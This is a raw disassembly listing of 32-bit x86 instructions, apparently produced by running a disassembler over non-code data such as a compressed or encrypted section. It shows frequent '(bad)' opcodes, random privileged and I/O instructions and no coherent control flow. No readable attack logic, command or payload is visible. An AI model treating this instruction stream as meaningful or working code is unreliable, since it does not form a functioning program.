  425dff:	clc    
  425e00:	sbb    ch,BYTE PTR [ebx]
  425e02:	sbb    al,bl
  425e04:	jl     0x425da2
  425e06:	ret    0x7937
  425e09:	xchg   BYTE PTR [edi],ch
  425e0b:	nop
  425e0c:	xlat   BYTE PTR ds:[ebx]
  425e0d:	stos   BYTE PTR es:[edi],al
  425e0e:	iret   
  425e0f:	pop    ecx
  425e10:	mov    ebx,0x2ad4268d
  425e15:	cwde   
  425e16:	ror    esi,cl
  425e18:	jge    0x425dab
  425e1a:	loopne 0x425df4
  425e1c:	test   ebp,esp
  425e1e:	push   edi
  425e1f:	gs jo  0x425e18
  425e22:	fwait
  425e23:	stos   BYTE PTR es:[di],al
  425e25:	test   al,0x5a
  425e27:	into   
  425e28:	push   ebx
  425e29:	jno    0x425e05
  425e2b:	and    al,0xa4
  425e2d:	mov    WORD PTR [eax+eiz*2],?
  425e30:	mov    WORD PTR [ebx],?
  425e32:	test   BYTE PTR [eax-0x5c74c183],ch
  425e38:	or     ecx,edx
  425e3a:	mov    dh,0x28
  425e3c:	jecxz  0x425e7d
  425e3e:	outs   dx,DWORD PTR ds:[esi]
  425e3f:	test   BYTE PTR [ebx],cl
  425e41:	inc    edx
  425e42:	adc    eax,0x955a85aa
  425e47:	(bad)  
  425e48:	test   DWORD PTR [ebx],0x58c8402d
  425e4e:	cdq    
  425e4f:	lea    ebx,[edi+esi*1-0x59]
  425e53:	adc    BYTE PTR [esi-0x6dd0fbff],dl
  425e59:	mov    cl,ah
  425e5b:	adc    esp,eax
  425e5d:	adc    al,0x5e
  425e5f:	sbb    al,0x21
  425e61:	dec    ecx
  425e62:	sub    al,0x23
  425e64:	or     eax,0x40e674ef
  425e69:	push   cs
  425e6a:	cwde   
  425e6b:	adc    DWORD PTR [ebp-0x6344686c],edi
  425e71:	imul   edi,DWORD PTR [edx-0x21],0xffffffe1
  425e75:	mov    dh,0xe8
  425e77:	loope  0x425e5e
  425e79:	(bad)  
  425e7a:	ss or  bh,dh
  425e7d:	mov    dl,0xfd
  425e7f:	push   esi
  425e80:	pop    eax
  425e81:	neg    DWORD PTR [eax-0x53]
  425e84:	sbb    al,0xd7
  425e86:	push   es
  425e87:	or     BYTE PTR [ebx-0x280e7f01],bl
  425e8d:	jl     0x425e16
  425e8f:	adc    al,0xa
  425e91:	mov    ebx,0xf5b57fe3
  425e96:	mov    BYTE PTR [ebp+0x1e],al
  425e99:	pop    eax
  425e9a:	outs   dx,DWORD PTR ds:[esi]
  425e9b:	sbb    bh,bl
  425e9d:	sub    al,BYTE PTR [edx]
  425e9f:	sahf   
  425ea0:	sub    BYTE PTR [eax],cl
  425ea2:	not    ecx
  425ea4:	cmc    
  425ea5:	pop    eax
  425ea6:	lds    esp,FWORD PTR [esi+0x6fa7f18a]
  425eac:	in     eax,dx
  425ead:	leave  
  425eae:	adc    BYTE PTR [edi+ebx*1],bh
  425eb1:	and    bh,cl
  425eb3:	sub    BYTE PTR [edx],cl
  425eb5:	ds xor al,0x72
  425eb8:	(bad)  
  425eb9:	fst    QWORD PTR [ebx]
  425ebb:	repnz xor ebp,DWORD PTR [ecx+0x3dbd230d]
	...
  425f32:	add    BYTE PTR [eax],al
  425f34:	dec    ebx
  425f35:	push   ss
  425f36:	int    0x41
  425f38:	fstp   st(3)
  425f3a:	iret   
  425f3b:	push   ds
  425f3c:	lock leave 
  425f3e:	jmp    DWORD PTR [ecx+0x25]
  425f41:	pushaw 
  425f43:	fbstp  TBYTE PTR [eax-0x6c]
  425f46:	add    DWORD PTR [eax],eax
  425f48:	test   BYTE PTR [eax],0x0
  425f4b:	add    BYTE PTR [edi],dh
  425f4d:	add    al,0xaf
  425f4f:	mov    eax,0x67da03b9
  425f54:	xor    eax,0x92c293f9
  425f59:	pop    esi
  425f5a:	xchg   ebp,eax
  425f5b:	sub    al,0xe3
  425f5d:	sbb    BYTE PTR [edx+edi*4],dh
  425f60:	popf   
  425f61:	mov    ebx,0x7dcfc42b
  425f66:	div    BYTE PTR [eax-0x5a]
  425f69:	(bad)
  425f6c:	dec    edi
  425f6d:	hlt    
  425f6e:	dec    ebx
  425f6f:	loope  0x425f19
  425f71:	xor    DWORD PTR [eax],edx
  425f73:	mov    ds:0x71d20b43,al
  425f78:	ret    
  425f79:	push   ecx
  425f7a:	xchg   ebx,eax
  425f7b:	(bad)  [ecx]
  425f7d:	out    dx,eax
  425f7e:	call   0x2cc6:0xa2b3ffee
  425f85:	adc    eax,0xaa80d830
  425f8a:	mov    WORD PTR [esi-0x640cc72f],ss
  425f90:	stos   BYTE PTR es:[edi],al
  425f91:	jmp    0x683c:0x480265b8
  425f98:	xchg   esp,eax
  425f99:	(bad)  
  425f9a:	cdq    
  425f9b:	xchg   edx,eax
  425f9c:	mov    bh,0xe5
  425f9e:	dec    ebx
  425f9f:	rcl    BYTE PTR [edi-0xc],1
  425fa2:	pop    ecx
  425fa3:	sub    al,0x67
  425fa5:	add    BYTE PTR [eax+0x71da0765],al
  425fab:	clc    
  425fac:	js     0x425f93
  425fae:	inc    edx
  425faf:	cli    
  425fb0:	xor    eax,0x21b5d6ad
  425fb5:	add    BYTE PTR [esi-0x4b6fd19c],0x97
  425fbc:	sti    
  425fbd:	mov    ch,BYTE PTR ds:0xf2cd7644
  425fc3:	ret    0x70f9
  425fc6:	adc    bl,BYTE PTR [eax+0xd188ee2]
  425fcc:	sbb    cl,BYTE PTR [eax-0x5dc3d278]
  425fd2:	jmp    0x284b50a
  425fd7:	sub    al,0xda
  425fd9:	test   al,0xb4
  425fdb:	rol    edi,0xc2
  425fde:	cld    
  425fdf:	push   cs
  425fe0:	inc    edx
  425fe1:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  425fe3:	jno    0x425f76
  425fe5:	in     eax,dx
  425fe6:	imul   eax,ecx,0x2f
  425fe9:	sbb    BYTE PTR ds:0xa1e5bacc,0x72
  425ff0:	addr16 into 
  425ff2:	and    DWORD PTR [ebp+0x1d9370e1],ebx
  425ff8:	stc    
  425ff9:	dec    edx
  425ffa:	loop   0x426074
  425ffc:	retf   0x3ead
  425fff:	xchg   ebx,eax
  426000:	cwde   
  426001:	jbe    0x425f89
  426003:	sbb    BYTE PTR [esi+edx*8-0x55],dh
  426007:	inc    edi
  426008:	jecxz  0x426016
  42600a:	cmc    
  42600b:	or     DWORD PTR ds:0xf567d306,edx
  426011:	lea    esi,[ebp-0x3111321d]
  426017:	mov    ch,0xd6
  426019:	mov    dl,0x2d
  42601b:	mov    eax,0x96207b86
  426020:	mov    ecx,0x5fbede89
  426025:	lea    esp,[ecx+0x1e]
  426028:	jl     0x425fd5
  42602a:	repz cld 
  42602c:	adc    esp,DWORD PTR [ebx]
  42602e:	in     eax,dx
  42602f:	inc    ecx
  426030:	xor    eax,DWORD PTR [edx-0x14]
  426033:	rol    BYTE PTR ds:0x487b617a,0xb
  42603a:	push   es
  42603b:	ss mov dh,0xaf
  42603e:	xchg   BYTE PTR [ebp+0xb],dl
  426041:	lods   eax,DWORD PTR ds:[esi]
	...
  4260b2:	add    BYTE PTR [eax],al
  4260b4:	ficom  WORD PTR [ecx]
  4260b6:	lahf   
  4260b7:	and    ebx,edi
  4260b9:	scas   eax,DWORD PTR es:[edi]
  4260ba:	(bad)  
  4260bb:	std    
  4260bc:	sub    al,0x28
  4260be:	pop    ds
  4260bf:	mov    eax,ds:0x7f51253f
  4260c4:	xchg   bp,ax
  4260c6:	add    DWORD PTR [eax],eax
  4260c8:	test   BYTE PTR [eax],0x0
  4260cb:	add    BYTE PTR [edx+0x30aefc72],bh
  4260d1:	loop   0x426149
  4260d3:	adc    al,ch
  4260d5:	or     al,0xd1
  4260d8:	pop    ebp
  4260d9:	shl    DWORD PTR [edi+0x26d90d3f],cl
  4260df:	lahf   
  4260e0:	mov    esp,0x75a7db70
  4260e5:	repz stc 
  4260e7:	jae    0x42615c
  4260e9:	in     eax,dx
  4260ea:	outs   dx,DWORD PTR ds:[esi]
  4260eb:	mov    ah,0x2
  4260ed:	loop   0x426166
  4260ef:	loopne 0x42610c
  4260f1:	cmp    BYTE PTR [eax-0x6927deab],dl
  4260f7:	and    eax,0x15d66d60
  4260fc:	or     esi,DWORD PTR [esp+ebp*1-0x31]
  426100:	mov    al,ds:0x20782f7a
  426105:	mov    ebx,0x2ad25b6a
  42610a:	enter  0x2591,0x2b
  42610e:	test   DWORD PTR [edx-0x1e113ce1],eax
  426114:	aam    0xa8
  426116:	adc    al,BYTE PTR [ecx+0x10b9efed]
  42611c:	sub    BYTE PTR [ecx-0x78],bl
  42611f:	in     eax,dx
  426120:	xor    ecx,DWORD PTR ds:0xa4cefae
  426126:	pop    esp
  426127:	cmp    ebp,DWORD PTR [edi]
  426129:	std    
  42612a:	push   ecx
  42612b:	fs call 0x3a30:0xad12a63c
  426133:	dec    eax
  426134:	dec    esp
  426135:	cs pop esi
  426137:	cmp    eax,0x7d0598f9
  42613c:	fidiv  DWORD PTR [esi+0x33b7136b]
  426142:	jg     0x426176
  426144:	repz sub dl,BYTE PTR [ebp-0x44]
  426148:	enter  0xd41f,0x39
  42614c:	mov    ecx,0xdff3aed2
  426151:	test   BYTE PTR [edi+0x3b1e2614],ah
  426157:	imul   edx,esp,0xe40d8367
  42615d:	sbb    al,0xe9
  42615f:	enter  0xe4a7,0x71
  426163:	jae    0x42615a
  426165:	add    ecx,DWORD PTR [ecx-0x60]
  426168:	jmp    0x3ac17d45
  42616d:	xlat   BYTE PTR ds:[ebx]
  42616e:	shl    DWORD PTR [esi],1
  426170:	or     eax,0x4d8f9b3b
  426175:	mov    eax,0x6bbea51b
  42617a:	stos   BYTE PTR es:[edi],al
  42617b:	pusha  
  42617c:	dec    edi
  42617d:	cmp    al,0x51
  42617f:	pop    edx
  426180:	mov    ah,0xf1
  426182:	xchg   ebp,eax
  426183:	iret   
  426184:	mov    bh,BYTE PTR [esi+0x6ab063fe]
  42618a:	test   eax,0x5268c8f8
  42618f:	daa    
  426190:	dec    edi
  426191:	mov    ebx,0x8af6b96f
  426196:	(bad)  
  426197:	fst    st(2)
  426199:	jmp    0x117da448
  42619e:	sbb    ecx,DWORD PTR [ebx+0x2e]
  4261a1:	mov    dl,0x43
  4261a3:	(bad)  
  4261a4:	call   0x2558c94a
  4261a9:	jmp    DWORD PTR [ecx-0x3a0917df]
  4261af:	inc    ebp
  4261b0:	sub    BYTE PTR [ecx+edx*4-0x33d66f9f],ah
  4261b7:	add    al,0x6f
  4261b9:	mov    ebp,0xac76930
  4261be:	outs   dx,BYTE PTR ds:[esi]
  4261bf:	jns    0x426235
  4261c1:	fld    QWORD PTR [eax]
	...
  426233:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42623a:	mov    ebp,0xdfb43ee6
  42623f:	push   0x48
  426241:	cmp    eax,0x965cecd7
  426246:	add    DWORD PTR [eax],eax
  426248:	test   BYTE PTR [eax],0x0
  42624b:	add    BYTE PTR [edi-0x40],bh
  42624e:	je     0x42620d
  426250:	xchg   ebx,eax
  426251:	cmc    
  426252:	pop    edx
  426253:	lahf   
  426254:	rol    DWORD PTR [eax+0x71],1
  426257:	add    BYTE PTR [edi+eiz*8],dl
  42625a:	fist   DWORD PTR [esi]
  42625c:	jnp    0x42625c
  42625e:	lahf   
  42625f:	retf   
  426260:	in     eax,0xef
  426262:	mov    al,ds:0x400087a6
  426267:	lahf   
  426268:	push   cs
  426269:	pop    esp
  42626a:	(bad)  
  42626b:	mov    ah,0x2a
  42626d:	sub    dl,ch
  42626f:	or     eax,0xe200f6a6
  426274:	push   eax
  426275:	sub    dl,0x53
  426278:	sub    BYTE PTR [edx+0x5fbd5752],0xde
  42627f:	inc    esp
  426280:	jo     0x4262e1
  426282:	pop    ebp
  426283:	stos   BYTE PTR es:[edi],al
  426284:	and    bl,bl
  426286:	imul   ecx,DWORD PTR [eax],0x3c
  426289:	push   ax
  42628b:	in     al,dx
  42628c:	(bad)  
  42628e:	adc    al,0xbf
  426290:	cmp    dl,BYTE PTR [ecx+0x54a650c3]
  426296:	pop    ecx
  426297:	sub    ch,BYTE PTR [esp+eax*4+0x6]
  42629b:	push   ebx
  42629c:	clc    
  42629d:	add    al,ah
  42629f:	sti    
  4262a0:	and    al,0x78
  4262a2:	and    al,0xa1
  4262a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262a5:	adc    esi,DWORD PTR [ecx+0x771f2d2f]
  4262ab:	data16 jecxz 0x42622f
  4262ae:	mov    esi,0x8a820d75
  4262b3:	sbb    ebx,DWORD PTR gs:[esi+0x279a8132]
  4262ba:	ins    DWORD PTR es:[edi],dx
  4262bb:	inc    eax
  4262bc:	mov    ds:0x27b7f465,al
  4262c1:	test   DWORD PTR [ecx-0x6d],esp
  4262c4:	cdq    
  4262c5:	inc    ebx
  4262c6:	jno    0x42631e
  4262c8:	js     0x42627f
  4262ca:	xchg   BYTE PTR [edi-0x4f6b8e0e],al
  4262d0:	fnstsw WORD PTR [edi]
  4262d2:	add    eax,0xc5dc5c3
  4262d7:	test   eax,0x2d20dc74
  4262dc:	jge    0x4262ee
  4262de:	in     al,0xc4
  4262e0:	push   0x8
  4262e2:	ror    ch,cl
  4262e4:	cmp    cl,0xa3
  4262e7:	repnz retf 
  4262e9:	mov    eax,0x2599fda5
  4262ee:	pop    ds
  4262ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262f0:	xchg   ah,ch
  4262f2:	aam    0x2a
  4262f4:	cmp    ecx,edx
  4262f6:	in     al,0xa6
  4262f8:	div    DWORD PTR [esi+0x7e3525ad]
  4262fe:	test   BYTE PTR [ecx-0x69],0xd7
  426302:	lahf   
  426303:	outs   dx,DWORD PTR ds:[esi]
  426304:	mov    al,ds:0x9824308e
  426309:	loope  0x4262d2
  42630b:	(bad)  
  42630c:	stos   BYTE PTR es:[edi],al
  42630d:	leave  
  42630e:	push   eax
  42630f:	in     eax,0x81
  426311:	neg    ah
  426313:	leave  
  426314:	dec    eax
  426315:	jne    0x426346
  426317:	or     BYTE PTR [ecx-0x8],bl
  42631a:	sub    ch,0xfb
  42631d:	shr    BYTE PTR cs:[eax-0x1bbd5717],1
  426324:	mov    esi,0x57bdf86a
  426329:	inc    edi
  42632a:	jo     0x426345
  42632c:	mov    dh,0xed
  42632e:	xor    cl,ch
  426330:	stos   BYTE PTR es:[edi],al
  426331:	ret    
  426332:	and    BYTE PTR [ebx-0x68544df6],ch
  426338:	pusha  
  426339:	lea    esi,[ecx-0x1c]
  42633c:	das    
  42633d:	(bad)  
  42633f:	add    BYTE PTR [ecx-0x50],cl
	...
  4263b2:	add    BYTE PTR [eax],al
  4263b4:	inc    edx
  4263b5:	or     esp,eax
  4263b7:	test   eax,0xeb6fedcf
  4263bc:	(bad)  
  4263be:	mov    dh,0xba
  4263c0:	inc    ecx
  4263c1:	aam    0x7c
  4263c3:	ja     0x426417
  4263c5:	xchg   edi,eax
  4263c6:	add    DWORD PTR [eax],eax
  4263c8:	test   BYTE PTR [eax],0x0
  4263cb:	add    BYTE PTR [ebp+0x3c],dl
  4263ce:	xchg   bh,dh
  4263d0:	leave  
  4263d1:	in     eax,dx
  4263d2:	outs   dx,BYTE PTR ds:[esi]
  4263d3:	adc    esp,DWORD PTR [edi*2+0x18a78dee]
  4263da:	in     eax,0x98
  4263dc:	ins    BYTE PTR es:[edi],dx
  4263dd:	mov    cl,0x6e
  4263df:	lods   eax,DWORD PTR ds:[esi]
  4263e0:	sub    DWORD PTR [edx-0xf],0xffffffb5
  4263e4:	scas   al,BYTE PTR es:[edi]
  4263e5:	fwait
  4263e6:	aam    0x48
  4263e8:	test   BYTE PTR [ecx+esi*8-0x47],al
  4263ec:	in     eax,0xc9
  4263ee:	ror    bl,1
  4263f0:	sub    eax,0x4cdbcfed
  4263f5:	mov    ch,0xdb
  4263f7:	add    ebp,esi
  4263f9:	xor    BYTE PTR [ecx],al
  4263fb:	loope  0x426474
  4263fd:	adc    DWORD PTR [ebx],0xffffffa9
  426400:	shl    ch,0xe3
  426403:	jnp    0x4263d1
  426405:	xor    eax,0x68f57a85
  42640a:	jne    0x42639c
  42640c:	xchg   ebp,eax
  42640d:	in     eax,dx
  42640e:	xchg   ecx,eax
  42640f:	je     0x4263d5
  426411:	sti    
  426412:	clc    
  426413:	jecxz  0x426400
  426415:	rol    BYTE PTR [edi],1
  426417:	sbb    esp,DWORD PTR [edi]
  426419:	xchg   DWORD PTR [eax],esp
  42641b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42641c:	dec    ecx
  42641d:	shl    BYTE PTR ds:0x6b32fcca,cl
  426423:	(bad)  
  426424:	inc    edi
  426425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426427:	mov    ds:0x3251a80a,eax
  42642c:	push   edx
  42642d:	pop    esi
  42642e:	pop    esi
  42642f:	add    esp,DWORD PTR [esi+0x7e3efbb5]
  426435:	(bad)  
  426436:	cli    
  426437:	sub    eax,0xe7e8ed
  42643c:	int    0x1b
  42643e:	lock sbb esi,esi
  426441:	int3   
  426442:	sub    dh,BYTE PTR [edi]
  426444:	fistp  QWORD PTR fs:0x9719e091
  42644b:	sahf   
  42644c:	xchg   ebx,eax
  42644d:	pop    esi
  42644e:	ins    DWORD PTR es:[edi],dx
  42644f:	sbb    ch,ah
  426451:	fild   WORD PTR [ecx-0x5b]
  426454:	jmp    0xfbba1a02
  426459:	mov    DWORD PTR [eax-0x12],esp
  42645c:	push   ebx
  42645d:	daa    
  42645e:	popa   
  42645f:	mov    dh,0x61
  426461:	inc    edi
  426462:	jno    0x426405
  426464:	and    al,0x7b
  426466:	inc    ebp
  426467:	fs dec ecx
  426469:	jl     0x426422
  42646b:	mov    ebp,0xaf326fcb
  426470:	lods   eax,DWORD PTR ds:[esi]
  426471:	in     al,dx
  426472:	jmp    0x4264ea
  426474:	lock out 0x87,eax
  426477:	push   0xffffff8f
  426479:	in     al,dx
  42647a:	ret    
  42647b:	outs   dx,BYTE PTR ds:[esi]
  42647c:	(bad)  
  42647d:	loopne 0x426492
  42647f:	push   ebx
  426480:	test   DWORD PTR [esi-0x1c],esp
  426483:	addr16 sti 
  426485:	dec    ebx
  426486:	xor    eax,eax
  426488:	hlt    
  426489:	adc    BYTE PTR [esi-0x5c],bh
  42648c:	jns    0x4264f2
  42648e:	xchg   edi,eax
  42648f:	cmp    esi,esp
  426491:	dec    esi
  426492:	xchg   ecx,eax
  426493:	push   0x78
  426495:	jle    0x42643f
  426497:	adc    al,0xf3
  426499:	xor    dh,BYTE PTR [esi+0x18abd1ee]
  42649f:	adc    BYTE PTR [ebx-0x4],cl
  4264a2:	push   ecx
  4264a3:	or     eax,0xf501c6d3
  4264a8:	addr16 cmc 
  4264aa:	daa    
  4264ab:	sbb    BYTE PTR [ebx],0x64
  4264ae:	xor    bh,0x35
  4264b1:	sbb    eax,0x877a52be
  4264b6:	dec    esp
  4264b7:	sub    DWORD PTR [edx+ebx*1+0x517d2bfe],esp
  4264be:	ficom  DWORD PTR [ebp+0xd0fa]
	...
  426534:	(bad)  
  426535:	jmp    0xfef4:0xfe6e7a4e
  42653c:	loop   0x42656c
  42653e:	dec    ebx
  42653f:	pop    esp
  426540:	adc    bl,BYTE PTR [ecx+edx*4+0x198488d]
  426547:	add    dh,dh
  426549:	add    BYTE PTR [eax],al
  42654b:	add    BYTE PTR [edi],bh
  42654d:	mov    esp,0x50a95a4c
  426552:	gs ins BYTE PTR es:[edi],dx
  426554:	xchg   BYTE PTR [ecx],ah
  426556:	push   cs
  426557:	int    0x94
  426559:	sub    edi,DWORD PTR [edx-0x1c]
  42655c:	enter  0xda14,0x13
  426560:	mov    al,ds:0xb4a04ef3
  426565:	lods   al,BYTE PTR ds:[esi]
  426566:	(bad)  
  426567:	lods   al,BYTE PTR ds:[esi]
  426568:	push   esp
  426569:	cli    
  42656a:	iret   
  42656b:	out    dx,al
  42656c:	xchg   esi,eax
  42656d:	inc    edx
  42656e:	mov    al,0x3a
  426570:	mov    cl,0xdc
  426572:	loopne 0x426586
  426574:	ror    DWORD PTR [ebp+0x38],cl
  426577:	sub    al,0x9b
  426579:	add    dl,0xf6
  42657c:	scas   al,BYTE PTR es:[edi]
  42657d:	lea    ebp,[edx]
  42657f:	and    ebp,ebx
  426581:	jb     0x42654f
  426583:	(bad)  
  426584:	repnz inc ecx
  426586:	pop    ss
  426587:	lea    eax,[edi+0x7d]
  42658a:	jb     0x426584
  42658c:	push   0x5b
  42658e:	nop
  42658f:	stos   DWORD PTR es:[edi],eax
  426590:	popa   
  426591:	sahf   
  426592:	cwde   
  426593:	call   DWORD PTR [esi+0x4c1ac9d0]
  426599:	sahf   
  42659a:	adc    al,0xc3
  42659c:	xchg   DWORD PTR [esp+ecx*2],eax
  42659f:	dec    esp
  4265a0:	dec    edi
  4265a1:	xchg   BYTE PTR [eax+eax*1-0x53],bl
  4265a5:	add    BYTE PTR [eax-0x55],dh
  4265a8:	mov    dl,0x55
  4265aa:	les    esi,FWORD PTR [edi+ebp*1+0x58]
  4265ae:	sbb    BYTE PTR [edi+0x35],bh
  4265b1:	jno    0x426573
  4265b3:	aaa    
  4265b4:	adc    BYTE PTR [esi-0x69],0xde
  4265b8:	cwde   
  4265b9:	jno    0x4265c1
  4265bb:	test   BYTE PTR [ecx+ebx*1-0x4d9b89aa],bh
  4265c2:	test   al,0x64
  4265c4:	js     0x426564
  4265c6:	xchg   edi,eax
  4265c7:	in     eax,0x32
  4265c9:	xchg   esp,eax
  4265ca:	mov    ecx,0xa5b0d1f4
  4265cf:	pusha  
  4265d0:	sbb    bh,bl
  4265d2:	mov    dl,0xb0
  4265d4:	rol    DWORD PTR [edx+0x7b],1
  4265d7:	imul   dh
  4265d9:	dec    ebx
  4265da:	test   DWORD PTR [ebx],0xc232616f
  4265e0:	cmc    
  4265e1:	fisttp WORD PTR [esi+0x5c]
  4265e4:	xchg   DWORD PTR [eax-0x268b3369],esp
  4265ea:	(bad)  
  4265eb:	sbb    BYTE PTR [esi-0x2897f71b],bl
  4265f1:	popa   
  4265f2:	jp     0x426669
  4265f4:	pop    ebp
  4265f5:	shr    DWORD PTR [ebp+0x5882c315],1
  4265fb:	fdiv   QWORD PTR [ecx]
  4265fd:	or     DWORD PTR ds:0x42965b1a,ebx
  426603:	mov    BYTE PTR [ebx+eax*4],0xd2
  426607:	pop    ss
  426608:	hlt    
  426609:	out    dx,al
  42660a:	mov    al,0xff
  42660c:	fucomi st,st(5)
  42660e:	xchg   ebp,eax
  42660f:	cwde   
  426610:	ret    0xed4b
  426613:	call   0xce4b001
  426618:	xor    eax,0x9ca3f391
  42661d:	adc    ah,BYTE PTR [esi-0xd]
  426620:	ret    
  426621:	mov    bl,0x2a
  426623:	mov    ds:0x351b45d7,al
  426628:	shl    al,cl
  42662a:	stos   BYTE PTR es:[di],al
  42662c:	sbb    dh,BYTE PTR gs:[esi]
  42662f:	fst    QWORD PTR ds:0x662164f7
  426635:	xor    BYTE PTR [ebx],dl
  426637:	sbb    dl,BYTE PTR [edx-0xacb1881]
  42663d:	or     esp,DWORD PTR [edx]
  42663f:	out    0xad,eax
  426641:	adc    DWORD PTR [eax],eax
	...
  4266b3:	add    dh,dl
  4266b5:	aaa    
  4266b6:	shl    BYTE PTR [ebx+esi*8],cl
  4266b9:	cmc    
  4266ba:	div    bh
  4266bc:	rcl    ah,cl
  4266be:	inc    esi
  4266bf:	pop    edi
  4266c0:	sub    bl,BYTE PTR [ebp+0x50]
  4266c3:	or     al,0x3e
  4266c5:	cdq    
  4266c6:	add    DWORD PTR [eax],eax
  4266c8:	test   BYTE PTR [eax],0x0
  4266cb:	add    BYTE PTR [ecx],cl
  4266cd:	data16 mov cl,0x8f
  4266d0:	stc    
  4266d1:	mov    edx,0xefd313e6
  4266d6:	fiadd  DWORD PTR [edx]
  4266d8:	inc    ebp
  4266d9:	xrelease mov BYTE PTR [eax],bh
  4266dc:	cs cmp al,0x57
  4266df:	mov    ch,BYTE PTR [ecx+eax*2+0x6b7855ce]
  4266e6:	push   0x63b28fa8
  4266eb:	or     BYTE PTR [ebx],0x59
  4266ee:	loopne 0x426744
  4266f0:	pop    ebx
  4266f1:	pop    edi
  4266f2:	pop    es
  4266f3:	or     esi,edx
  4266f5:	cwde   
  4266f6:	outs   dx,DWORD PTR ds:[esi]
  4266f7:	jno    0x4266fc
  4266f9:	lea    edx,[edx-0x38]
  4266fc:	push   ebx
  4266fd:	jb     0x4266f5
  4266ff:	sub    BYTE PTR [eax],dl
  426701:	dec    esi
  426702:	mov    ebx,0x4f8387c9
  426707:	adc    dl,bl
  426709:	out    0x5d,al
  42670b:	je     0x4266d5
  42670d:	scas   al,BYTE PTR es:[edi]
  42670e:	push   0xffffffcb
  426710:	cld    
  426711:	and    BYTE PTR [ebx],al
  426713:	mov    cl,0xf6
  426715:	int3   
  426716:	sbb    BYTE PTR [ebx],bl
  426718:	mov    ebx,eax
  42671a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42671b:	adc    eax,0xa3238563
  426720:	addr16 pop eax
  426722:	inc    eax
  426723:	sti    
  426724:	bound  edi,QWORD PTR [ebp-0x70]
  426727:	push   0x2dfd55bf
  42672c:	push   edi
  42672d:	out    0x78,eax
  42672f:	push   ss
  426730:	icebp  
  426731:	sbb    eax,0xea2a5b36
  426736:	xchg   ebx,eax
  426737:	or     eax,0x295dc122
  42673c:	and    DWORD PTR [ecx+ebx*4-0x57],ecx
  426740:	xchg   ebx,eax
  426741:	dec    ebx
  426742:	or     BYTE PTR [ebx-0xe8ff313],dh
  426748:	call   0xf338e063
  42674d:	leave  
  42674e:	mov    bh,0x2f
  426750:	enter  0x8e08,0x7a
  426754:	in     eax,0x27
  426756:	inc    ecx
  426757:	mov    DWORD PTR [ecx-0x7a],ebp
  42675a:	xor    edx,eax
  42675c:	or     dl,dh
  42675e:	mov    al,0x6f
  426760:	popf   
  426761:	popf   
  426762:	xor    DWORD PTR [eax-0x27],eax
  426765:	xchg   edx,eax
  426766:	pop    es
  426767:	jb     0x4267a6
  426769:	and    edi,DWORD PTR [ebx+edi*8]
  42676c:	jae    0x4266f9
  42676e:	mov    bl,0xd3
  426770:	jno    0x426713
  426772:	pop    ds
  426773:	addr16 push ecx
  426775:	dec    ebp
  426776:	mov    edx,0x7fd1a1b6
  42677b:	add    BYTE PTR [edi+0x64],al
  42677e:	(bad)  
  42677f:	xchg   ebx,eax
  426780:	mov    eax,ds:0x4657d0b6
  426785:	fwait
  426786:	mov    ds:0x2ffcbacd,al
  42678b:	jmp    0xe16367d6
  426790:	add    al,0xe9
  426792:	enter  0x269b,0xc4
  426796:	jge    0x4267c7
  426798:	mov    db7,ebp
  42679b:	mov    ds:0x72ddaca9,eax
  4267a0:	inc    ebp
  4267a1:	iret   
  4267a2:	mov    ah,0xcb
  4267a4:	inc    ebx
  4267a5:	pop    eax
  4267a6:	push   ds
  4267a7:	nop
  4267a8:	sub    DWORD PTR [ecx],edx
  4267aa:	sub    BYTE PTR [eax+0x70323256],bh
  4267b0:	addr16 adc al,0xa5
  4267b3:	jmp    0x5c2d:0x3353a073
  4267ba:	test   DWORD PTR [edx+0x3f5a345f],esi
  4267c0:	pop    ds
  4267c1:	jge    0x4267c3
	...
  426833:	add    BYTE PTR [edx+edx*2-0x70],bl
  426837:	push   edx
  426838:	sahf   
  426839:	rcr    dh,cl
  42683b:	pop    esi
  42683c:	test   BYTE PTR [esi+edi*8-0xad9c4cc],cl
  426843:	out    dx,eax
  426844:	xor    al,0x9a
  426846:	add    DWORD PTR [eax],eax
  426848:	test   BYTE PTR [eax],0x0
  42684b:	add    BYTE PTR [esi+ebp*8+0x58],al
  42684f:	or     esp,DWORD PTR [esi+0xd2389e3]
  426855:	xchg   dh,bh
  426857:	cli    
  426858:	push   ss
  426859:	cli    
  42685a:	cmp    ebx,DWORD PTR [ebx+0x66]
  42685d:	xchg   ebx,eax
  42685e:	ret    
  42685f:	cmp    eax,DWORD PTR [ecx-0x49aa8f09]
  426865:	dec    ecx
  426866:	sahf   
  426867:	pop    ds
  426868:	push   edx
  426869:	jp     0x4268cd
  42686b:	out    dx,al
  42686c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42686d:	inc    edi
  42686e:	les    ecx,FWORD PTR [edi+0x5dbd8679]
  426874:	fbld   TBYTE PTR [ecx]
  426876:	pop    edx
  426877:	mov    edi,0x65120ca1
  42687c:	xor    eax,0xdec39864
  426881:	fistp  DWORD PTR [ecx+0x56]
  426884:	inc    edx
  426885:	inc    esi
  426886:	out    dx,al
  426887:	shl    DWORD PTR [eax+ecx*1],1
  42688a:	adc    ch,BYTE PTR [ecx]
  42688c:	inc    edx
  42688d:	loope  0x4268b0
  42688f:	repz dec ecx
  426891:	stos   BYTE PTR es:[edi],al
  426892:	ficom  WORD PTR [edx+0x78]
  426895:	mov    dl,0x1e
  426897:	sbb    DWORD PTR [ebx-0xa],ecx
  42689a:	mov    DWORD PTR [ecx-0x14],0x5fa356c8
  4268a1:	int    0x4f
  4268a3:	lock or BYTE PTR [ebp+0x2b4ca95e],dh
  4268aa:	sub    bh,cl
  4268ac:	adc    eax,DWORD PTR [eax]
  4268ae:	xchg   al,ah
  4268b0:	and    BYTE PTR [edi+0xc],0x61
  4268b4:	js     0x426872
  4268b6:	add    BYTE PTR [eax],bh
  4268b8:	ja     0x426909
  4268ba:	dec    BYTE PTR ds:0xa29fb78c
  4268c0:	add    eax,0xbb821cae
  4268c5:	dec    esp
  4268c6:	jnp    0x4268be
  4268c8:	mov    al,0x3a
  4268ca:	push   es
  4268cb:	call   0x25592428
  4268d0:	push   cs
